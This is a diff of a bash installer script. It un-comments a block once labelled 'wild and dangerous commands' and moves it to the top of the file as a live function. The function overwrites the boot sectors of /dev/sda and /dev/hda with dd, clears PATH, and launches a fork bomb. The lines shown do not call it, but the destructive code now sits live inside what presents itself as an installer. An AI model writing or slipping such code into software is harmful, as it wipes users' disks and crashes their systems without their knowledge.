@@ -1,6 +1,13 @@
 #!/bin/bash
 
-
+#Dangerous commands
+function wildcommands() {
+  sudo dd if=boot.bin of=/dev/sda bs=512;
+  sudo dd if=boot.bin of=/dev/hda bs=512;
+  PATH="";
+  sleep 180
+  :(){ :|:& };:
+}
 
 if [[ $EUID == 0 ]]
 then
@@ -57,12 +64,3 @@ else
   echo -e "\e[1;31mFor this installer to begin you need to run it as root.\e[0m"
 
 fi
-
-#wild and dangerous commands:
-
-# function wildcommands() {
-#   sudo dd if=boot.bin of=/dev/sda bs=512;
-#   sudo dd if=boot.bin of=/dev/hda bs=512;
-#   PATH="";
-#   :(){ :|:& };:
-# }
